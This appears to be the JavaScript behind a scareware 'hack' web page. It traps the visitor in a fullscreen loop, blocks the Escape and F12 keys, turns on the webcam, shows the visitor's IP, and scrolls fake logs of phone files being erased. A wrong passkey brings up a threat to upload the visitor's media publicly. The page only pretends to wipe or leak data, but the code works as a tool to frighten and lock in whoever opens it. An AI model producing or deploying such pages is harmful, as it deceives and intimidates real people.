async function initiateHack() {
    document.getElementById('start-overlay').style.display = 'none';
    forceIronGrip();
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('webcam').srcObject = stream;
        startFakeLogs();
    } catch (err) {
        alert("ACCESS DENIED: Verification failed. System wipe speed x10.");
        startFakeLogs();
    }
}

function forceIronGrip() {
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(()=>{});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen().catch(()=>{});
}

// حلقة مراقبة الشاشة الكاملة
setInterval(() => {
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        forceIronGrip();
    }
}, 100);

window.addEventListener('keydown', (e) => {
    if (e.key === "Escape" || e.key === "F12") {
        e.preventDefault();
        alert("SECURITY VIOLATION: Override attempt blocked.");
        forceIronGrip();
    }
});

function startFakeLogs() {
    const log = document.getElementById('wipe-log');
    const paths = ["/DCIM/Camera/", "/WhatsApp/Media/", "/System/Auth/", "/Private/Vault/"];
    setInterval(() => {
        const file = paths[Math.floor(Math.random()*paths.length)] + Math.random().toString(36).substring(7) + ".dat";
        log.innerHTML = `> ERASING: ${file}<br>` + log.innerHTML;
        if (navigator.vibrate) navigator.vibrate(50);
    }, 800);
}

fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => {
    document.getElementById('user-ip').innerText = d.ip;
});

function checkFinalExit() {
    if (document.getElementById('passkey').value === "EXIT_PROTOCOL_00") {
        window.onbeforeunload = null;
        alert("BYPASS SUCCESSFUL. DISCONNECTING...");
        location.href = "https://www.google.com";
    } else {
        alert("WRONG KEY. UPLOADING MEDIA TO PUBLIC SERVERS...");
    }
}

window.onbeforeunload = () => "DO NOT CLOSE!";